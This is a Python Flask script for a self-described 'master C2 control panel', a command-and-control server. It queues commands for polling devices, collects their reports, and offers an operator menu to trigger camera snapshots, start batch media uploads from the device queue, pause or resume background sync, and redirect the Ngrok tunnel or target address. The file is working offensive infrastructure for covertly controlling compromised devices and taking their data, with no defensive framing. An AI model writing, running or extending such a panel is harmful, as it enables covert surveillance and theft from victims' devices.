from flask import Flask, request
import threading

app = Flask(__name__)

current_command = "net_info"
current_target_endpoint = "http://YOUR_SERVER_IP:8080/command_poll"
received_logs = []

@app.route('/command_poll', methods=['GET'])
def command_poll():
    global current_command
    cmd_to_send = current_command
    current_command = "no_op"
    return cmd_to_send, 200

@app.route('/report', methods=['POST'])
def report_data():
    data = request.data.decode('utf-8')
    received_logs.append(data)
    print(f"\n[+] DEVICE REPORT: {data}")
    return "OK", 200

def terminal_control():
    global current_command, current_target_endpoint
    while True:
        print("\n=========================================")
        print("     ULTIMATE MASTER C2 CONTROL PANEL    ")
        print("=========================================")
        print("1. net_info                      - Check connection & queue size")
        print("2. show_config                   - View currently active target IP/URL")
        print("3. update_tunnel_url [URL]       - Change Port Forwarding/Ngrok Link")
        print("4. set_target_server [IP]        - Change Direct Local IP & Port")
        print("5. sync_media                    - Trigger batch upload from queue")
        print("6. pause_sync                    - Pause background queue sync")
        print("7. resume_sync                   - Resume background queue sync")
        print("8. cam_snapshot_trigger          - Check camera active state & capture")
        print("-----------------------------------------")
        
        choice = input("Enter command string > ").strip()
        
        if choice.startswith("update_tunnel_url") or choice.startswith("set_target_server"):
            parts = choice.split(" ")
            if len(parts) > 1:
                current_target_endpoint = parts[1]
                print(f"[*] Target tracker updated to: {current_target_endpoint}")
        
        if choice == "show_config":
            print(f"\n[INFO] Current Endpoint: {current_target_endpoint}\n")
            continue

        if choice:
            current_command = choice
            print(f"[*] Command successfully queued: {choice}")

if __name__ == '__main__':
    cli_thread = threading.Thread(target=terminal_control, daemon=True)
    cli_thread.start()
    
    # Running on Port 8080 to avoid any conflict
    app.run(host='0.0.0.0', port=8080, threaded=True, debug=False)
